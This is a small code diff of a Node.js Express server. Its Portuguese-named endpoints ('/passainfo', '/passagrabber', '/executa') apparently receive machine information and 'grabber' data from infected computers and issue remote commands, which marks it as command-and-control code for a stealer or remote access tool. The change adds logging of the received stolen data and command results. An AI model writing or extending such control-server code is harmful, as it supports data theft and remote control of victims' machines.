@@ -14,15 +14,18 @@ var resultado
 app.post(`/passainfo`, (req, res) => {
     res.send(`OK`)
     infopc = req.body
+    console.log(infopc)
 })
 app.post(`/passagrabber`, (req, res) => {
     res.send(`OK`)
     infopG = req.body
+    console.log(infopG)
 })
 app.post(`/executa`, (req, res) => {
     res.send(comando)
     comando = ''
 resultado = req.body.js
+    console.log(resultado)
 })
 
 app.post(`/executaA`, async(req, res) => {
